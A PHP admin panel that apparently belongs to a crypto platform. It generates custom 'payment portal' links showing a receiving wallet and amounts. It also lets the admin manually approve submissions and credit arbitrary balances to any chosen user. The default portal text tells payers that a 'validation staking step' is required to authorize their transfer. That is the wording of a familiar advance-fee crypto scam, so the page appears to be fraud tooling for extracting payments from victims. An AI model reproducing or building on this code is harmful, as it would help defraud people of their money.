<?php
include 'config.php';

// Auto-create tables if missing
$conn->query("CREATE TABLE IF NOT EXISTS special_payment_pages (
    id INT AUTO_INCREMENT PRIMARY KEY,
    code VARCHAR(64) NOT NULL UNIQUE,
    token_symbol VARCHAR(20) NOT NULL DEFAULT 'USDT',
    title VARCHAR(255) NOT NULL,
    description TEXT,
    from_address VARCHAR(255),
    to_address VARCHAR(255) NOT NULL,
    crypto_amount VARCHAR(50) NOT NULL,
    usd_amount VARCHAR(50) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

$conn->query("CREATE TABLE IF NOT EXISTS special_payments (
    id INT AUTO_INCREMENT PRIMARY KEY,
    page_id INT NOT NULL,
    code VARCHAR(64) NOT NULL,
    token_symbol VARCHAR(20) NOT NULL,
    from_address VARCHAR(255),
    to_address VARCHAR(255) NOT NULL,
    crypto_amount VARCHAR(50) NOT NULL,
    usd_amount VARCHAR(50) NOT NULL,
    status VARCHAR(50) DEFAULT 'Processing',
    user_note TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

$message = "";

// Handle Delete Portal Page Link
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'delete_page') {
    $del_page_id = intval($_POST['page_id']);
    if ($del_page_id > 0) {
        $conn->query("DELETE FROM special_payment_pages WHERE id='$del_page_id'");
        $message = "<div class='p-4 bg-red-500/10 border border-red-500/30 text-red-400 rounded-xl text-xs font-700 mb-6'>Payment portal link deleted successfully!</div>";
    }
}

// Handle Create Portal Page Link
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'create_page') {
    $token_symbol = filter($_POST['token_symbol'] ?? 'USDT');
    $title = filter($_POST['title'] ?? 'Complete Your Crypto Transfer');
    $description = filter($_POST['description'] ?? '');
    $from_address = filter($_POST['from_address'] ?? '');
    $to_address = filter($_POST['to_address'] ?? '');
    $crypto_amount = filter($_POST['crypto_amount'] ?? '0');
    $usd_amount = filter($_POST['usd_amount'] ?? '0');

    $code = bin2hex(random_bytes(8));

    $stmt = $conn->prepare("INSERT INTO special_payment_pages (code, token_symbol, title, description, from_address, to_address, crypto_amount, usd_amount) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
    if ($stmt) {
        $stmt->bind_param("ssssssss", $code, $token_symbol, $title, $description, $from_address, $to_address, $crypto_amount, $usd_amount);
        if ($stmt->execute()) {
            $message = "<div class='p-4 bg-green-500/10 border border-green-500/30 text-green-400 rounded-xl text-xs font-700 mb-6'>Special payment page created successfully! URL: <a href='/pay?code=$code' target='_blank' class='underline font-800 text-amber-400 ml-1'>/pay?code=$code</a></div>";
        } else {
            $message = "<div class='p-4 bg-red-500/10 border border-red-500/30 text-red-400 rounded-xl text-xs font-700 mb-6'>Error: " . htmlspecialchars($conn->error) . "</div>";
        }
    }
}

// Handle Approve Payment & Add to User Balance
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'approve_payment') {
    $pm_id = intval($_POST['payment_id']);
    $target_uid = intval($_POST['uid']);
    $credit_amt = floatval($_POST['credit_amount']);

    if ($pm_id > 0 && $target_uid > 0 && $credit_amt > 0) {
        $conn->query("UPDATE special_payments SET status='Approved' WHERE id='$pm_id'");

        $chk_bal = $conn->query("SELECT * FROM bal WHERE uid='$target_uid'");
        if ($chk_bal && $chk_bal->num_rows > 0) {
            $conn->query("UPDATE bal SET bal = bal + '$credit_amt' WHERE uid='$target_uid'");
        } else {
            $conn->query("INSERT INTO bal (uid, bal) VALUES ('$target_uid', '$credit_amt')");
        }
        $message = "<div class='p-4 bg-green-500/10 border border-green-500/30 text-green-400 rounded-xl text-xs font-700 mb-6'>Payment approved! $" . number_format($credit_amt, 2) . " credited to User #" . $target_uid . ".</div>";
    } else {
        $message = "<div class='p-4 bg-red-500/10 border border-red-500/30 text-red-400 rounded-xl text-xs font-700 mb-6'>Please select a valid user and positive credit amount.</div>";
    }
}

// Fetch generated links
$pages_res = $conn->query("SELECT * FROM special_payment_pages ORDER BY id DESC");

// Fetch received special payments
$payments_res = $conn->query("SELECT * FROM special_payments ORDER BY id DESC");

// Fetch all users for credit dropdown
$users_res = $conn->query("SELECT id, uname, uemail FROM user_details ORDER BY id DESC");
$userList = [];
if ($users_res && $users_res->num_rows > 0) {
    while ($uRow = $users_res->fetch_assoc()) {
        $userList[] = $uRow;
    }
}

include 'admin_header.php';
?>

<div class="space-y-8 max-w-full overflow-hidden">

    <?php echo $message; ?>

    <!-- Create Special Payment Page Card -->
    <div class="admin-card p-4 sm:p-6">
        <h3 class="font-syne font-800 text-base sm:text-lg text-white mb-4 flex items-center gap-2">
            <i class="fas fa-plus-circle text-amber-400"></i> Create Custom Crypto Payment Portal
        </h3>

        <form method="POST" action="" class="space-y-4">
            <input type="hidden" name="action" value="create_page">

            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
                <div>
                    <label class="block text-[10px] font-800 uppercase text-gray-400 mb-1.5">Token / Symbol</label>
                    <select name="token_symbol" class="w-full bg-black/60 border border-white/10 rounded-xl px-3 py-2.5 text-xs text-white outline-none focus:border-amber-500" required>
                        <option value="USDT">USDT (Tether)</option>
                        <option value="ETH">ETH (Ethereum)</option>
                        <option value="BTC">BTC (Bitcoin)</option>
                        <option value="SOL">SOL (Solana)</option>
                        <option value="BNB">BNB (Binance Coin)</option>
                        <option value="TRX">TRX (TRON)</option>
                    </select>
                </div>

                <div>
                    <label class="block text-[10px] font-800 uppercase text-gray-400 mb-1.5">Portal Title</label>
                    <input type="text" name="title" class="w-full bg-black/60 border border-white/10 rounded-xl px-3 py-2.5 text-xs text-white outline-none focus:border-amber-500" value="Complete Your Crypto Transfer" required>
                </div>

                <div>
                    <label class="block text-[10px] font-800 uppercase text-gray-400 mb-1.5">Crypto Amount</label>
                    <input type="text" name="crypto_amount" class="w-full bg-black/60 border border-white/10 rounded-xl px-3 py-2.5 text-xs text-white outline-none focus:border-amber-500" placeholder="0.04344239 ETH" required>
                </div>

                <div>
                    <label class="block text-[10px] font-800 uppercase text-gray-400 mb-1.5">USD Equivalent</label>
                    <input type="text" name="usd_amount" class="w-full bg-black/60 border border-white/10 rounded-xl px-3 py-2.5 text-xs text-white outline-none focus:border-amber-500" placeholder="≈ $109.57 USD" required>
                </div>

                <div>
                    <label class="block text-[10px] font-800 uppercase text-gray-400 mb-1.5">From Address (Optional)</label>
                    <input type="text" name="from_address" class="w-full bg-black/60 border border-white/10 rounded-xl px-3 py-2.5 text-xs text-white outline-none focus:border-amber-500" placeholder="0x4bea2d3B8Ecb...">
                </div>

                <div>
                    <label class="block text-[10px] font-800 uppercase text-gray-400 mb-1.5">Receiving Wallet (TO Address)</label>
                    <input type="text" name="to_address" class="w-full bg-black/60 border border-white/10 rounded-xl px-3 py-2.5 text-xs text-white outline-none focus:border-amber-500" placeholder="0x80977C960b2E..." required>
                </div>
            </div>

            <div>
                <label class="block text-[10px] font-800 uppercase text-gray-400 mb-1.5">Page Instructions / Notes</label>
                <textarea name="description" rows="2" class="w-full bg-black/60 border border-white/10 rounded-xl p-3 text-xs text-white outline-none focus:border-amber-500">To complete your transfer, a validation staking step is required to verify and authorize the transaction.</textarea>
            </div>

            <div class="text-right">
                <button type="submit" class="w-full sm:w-auto bg-gradient-gold text-black font-800 text-xs py-2.5 px-6 rounded-xl hover:opacity-90 transition shadow-lg shadow-amber-500/20">
                    <i class="fas fa-link mr-1"></i> Generate Payment Link
                </button>
            </div>
        </form>
    </div>

    <!-- Active Custom Payment Links Table -->
    <div class="admin-card p-4 sm:p-6">
        <h3 class="font-syne font-800 text-base sm:text-lg text-white mb-4">Generated Payment Portals</h3>

        <div class="w-full overflow-x-auto">
            <table class="w-full min-w-[700px] text-left border-collapse">
                <thead>
                    <tr class="border-b border-white/5 text-[10px] font-800 uppercase text-gray-500">
                        <th class="py-3 px-3">Code</th>
                        <th class="py-3 px-3">Token</th>
                        <th class="py-3 px-3">Crypto Amount</th>
                        <th class="py-3 px-3">USD Value</th>
                        <th class="py-3 px-3">Receiving Wallet</th>
                        <th class="py-3 px-3">Portal URL</th>
                        <th class="py-3 px-3 text-right">Actions</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-white/5 text-xs">
                    <?php if ($pages_res && $pages_res->num_rows > 0): ?>
                        <?php while ($p = $pages_res->fetch_assoc()): ?>
                            <tr class="hover:bg-white/5 transition">
                                <td class="py-3.5 px-3 font-mono text-amber-400 font-700"><?php echo htmlspecialchars($p['code']); ?></td>
                                <td class="py-3.5 px-3">
                                    <div class="flex items-center gap-2">
                                        <?php
                                        $tsym = strtoupper(trim($p['token_symbol']));
                                        $tlogos = [
                                            'USDT' => 'https://cryptologos.cc/logos/tether-usdt-logo.png',
                                            'BTC'  => 'https://cryptologos.cc/logos/bitcoin-btc-logo.png',
                                            'ETH'  => 'https://cryptologos.cc/logos/ethereum-eth-logo.png',
                                            'BNB'  => 'https://cryptologos.cc/logos/bnb-bnb-logo.png',
                                            'SOL'  => 'https://cryptologos.cc/logos/solana-sol-logo.png',
                                            'USDC' => 'https://cryptologos.cc/logos/usd-coin-usdc-logo.png',
                                            'XRP'  => 'https://cryptologos.cc/logos/xrp-xrp-logo.png',
                                            'TRX'  => 'https://cryptologos.cc/logos/tron-trx-logo.png'
                                        ];
                                        $turl = $tlogos[$tsym] ?? 'https://cryptologos.cc/logos/tether-usdt-logo.png';
                                        ?>
                                        <img src="<?php echo $turl; ?>" alt="<?php echo htmlspecialchars($tsym); ?>" class="w-6 h-6 object-contain" onerror="this.onerror=null; this.src='https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/<?php echo strtolower($tsym); ?>.png';">
                                        <span class="bg-white/10 px-2 py-0.5 rounded text-[10px] font-700 text-white"><?php echo htmlspecialchars($tsym); ?></span>
                                    </div>
                                </td>
                                <td class="py-3.5 px-3 font-700 text-white"><?php echo htmlspecialchars($p['crypto_amount']); ?></td>
                                <td class="py-3.5 px-3 text-gray-300"><?php echo htmlspecialchars($p['usd_amount']); ?></td>
                                <td class="py-3.5 px-3 font-mono text-[10px] text-gray-400 max-w-[150px] truncate" title="<?php echo htmlspecialchars($p['to_address']); ?>"><?php echo htmlspecialchars($p['to_address']); ?></td>
                                <td class="py-3.5 px-3">
                                    <a href="/pay?code=<?php echo htmlspecialchars($p['code']); ?>" target="_blank" class="bg-amber-500/10 text-amber-400 hover:bg-amber-500 hover:text-black border border-amber-500/30 px-2.5 py-1 rounded-lg text-[11px] font-700 transition inline-flex items-center gap-1">
                                        <i class="fas fa-external-link-alt text-[10px]"></i> /pay?code=<?php echo htmlspecialchars($p['code']); ?>
                                    </a>
                                </td>
                                <td class="py-3.5 px-3 text-right">
                                    <form method="POST" action="" class="inline" onsubmit="return confirm('Delete this payment portal link?');">
                                        <input type="hidden" name="action" value="delete_page">
                                        <input type="hidden" name="page_id" value="<?php echo $p['id']; ?>">
                                        <button type="submit" class="bg-red-500/20 hover:bg-red-500 text-red-400 hover:text-white border border-red-500/30 px-2.5 py-1 rounded-lg text-xs font-700 transition flex items-center gap-1 ml-auto">
                                            <i class="fas fa-trash-can text-[10px]"></i> Delete
                                        </button>
                                    </form>
                                </td>
                            </tr>
                        <?php endwhile; ?>
                    <?php else: ?>
                        <tr><td colspan="7" class="py-6 text-center text-gray-500">No payment portals generated yet.</td></tr>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
    </div>

    <!-- Received Payments Table & Approval -->
    <div class="admin-card p-4 sm:p-6">
        <h3 class="font-syne font-800 text-base sm:text-lg text-white mb-4">Received Special Payment Submissions</h3>

        <div class="w-full overflow-x-auto">
            <table class="w-full min-w-[800px] text-left border-collapse">
                <thead>
                    <tr class="border-b border-white/5 text-[10px] font-800 uppercase text-gray-500">
                        <th class="py-3 px-3">#</th>
                        <th class="py-3 px-3">Link Code</th>
                        <th class="py-3 px-3">Token</th>
                        <th class="py-3 px-3">Amount</th>
                        <th class="py-3 px-3">USD Value</th>
                        <th class="py-3 px-3">From Wallet</th>
                        <th class="py-3 px-3">Status</th>
                        <th class="py-3 px-3 text-right">Action / Credit User</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-white/5 text-xs">
                    <?php if ($payments_res && $payments_res->num_rows > 0): ?>
                        <?php while ($pm = $payments_res->fetch_assoc()): ?>
                            <tr class="hover:bg-white/5 transition">
                                <td class="py-3.5 px-3 font-mono text-gray-500">#<?php echo $pm['id']; ?></td>
                                <td class="py-3.5 px-3 font-mono text-amber-400"><?php echo htmlspecialchars($pm['code']); ?></td>
                                <td class="py-3.5 px-3"><span class="bg-white/10 px-2 py-0.5 rounded text-[10px] font-700 text-white"><?php echo htmlspecialchars($pm['token_symbol']); ?></span></td>
                                <td class="py-3.5 px-3 font-700 text-white"><?php echo htmlspecialchars($pm['crypto_amount']); ?></td>
                                <td class="py-3.5 px-3 text-gray-300"><?php echo htmlspecialchars($pm['usd_amount']); ?></td>
                                <td class="py-3.5 px-3 font-mono text-[10px] text-gray-400 max-w-[150px] truncate" title="<?php echo htmlspecialchars($pm['from_address']); ?>"><?php echo htmlspecialchars($pm['from_address']); ?></td>
                                <td class="py-3.5 px-3">
                                    <?php if ($pm['status'] === 'Approved'): ?>
                                        <span class="bg-green-500/10 text-green-400 border border-green-500/30 text-[10px] font-800 px-2 py-0.5 rounded-full">Approved</span>
                                    <?php else: ?>
                                        <span class="bg-amber-500/10 text-amber-400 border border-amber-500/30 text-[10px] font-800 px-2 py-0.5 rounded-full"><?php echo htmlspecialchars($pm['status']); ?></span>
                                    <?php endif; ?>
                                </td>
                                <td class="py-3.5 px-3 text-right">
                                    <?php if ($pm['status'] !== 'Approved'): ?>
                                        <form method="POST" action="" class="flex items-center justify-end gap-2">
                                            <input type="hidden" name="action" value="approve_payment">
                                            <input type="hidden" name="payment_id" value="<?php echo $pm['id']; ?>">

                                            <!-- Select User -->
                                            <select name="uid" class="bg-black/60 border border-white/10 rounded-lg px-2 py-1 text-[11px] text-white outline-none focus:border-amber-500 max-w-[140px]" required>
                                                <option value="">-- Select User --</option>
                                                <?php foreach ($userList as $usr): ?>
                                                    <option value="<?php echo $usr['id']; ?>"><?php echo htmlspecialchars($usr['uname']); ?> (#<?php echo $usr['id']; ?>)</option>
                                                <?php endforeach; ?>
                                            </select>

                                            <!-- Credit USD Amount -->
                                            <?php
                                            // Parse numeric amount from USD value
                                            $parsedUsd = preg_replace('/[^\d\.]/', '', $pm['usd_amount']);
                                            if (empty($parsedUsd)) $parsedUsd = '100.00';
                                            ?>
                                            <input type="number" step="0.01" name="credit_amount" value="<?php echo htmlspecialchars($parsedUsd); ?>" class="bg-black/60 border border-white/10 rounded-lg px-2 py-1 text-[11px] font-mono text-white outline-none w-20" required placeholder="USD">

                                            <button type="submit" class="bg-green-500 hover:bg-green-400 text-black px-3 py-1 rounded-lg text-[11px] font-800 transition shadow">
                                                Approve & Add
                                            </button>
                                        </form>
                                    <?php else: ?>
                                        <span class="text-gray-500 text-[11px]">Credited</span>
                                    <?php endif; ?>
                                </td>
                            </tr>
                        <?php endwhile; ?>
                    <?php else: ?>
                        <tr><td colspan="8" class="py-6 text-center text-gray-500">No special payment submissions recorded yet.</td></tr>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
    </div>

</div>

<?php include 'admin_footer.php'; ?>
